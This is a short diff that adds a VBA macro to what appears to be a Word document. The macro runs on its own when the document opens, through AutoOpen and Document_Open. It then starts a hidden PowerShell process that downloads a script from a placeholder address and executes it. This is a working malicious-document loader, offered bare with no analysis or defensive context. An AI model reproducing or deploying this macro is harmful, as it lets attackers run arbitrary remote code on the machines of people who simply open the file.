@@ -1,0 +1,13 @@
+Sub AutoOpen()
+    ballsack
+End Sub
+Sub Document_Open()
+    ballsack
+End Sub
+
+Sub ballsack()
+    Dim wsh As Object
+    Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('<IP>'))"""
+    Set wsh = Nothing
+End Sub
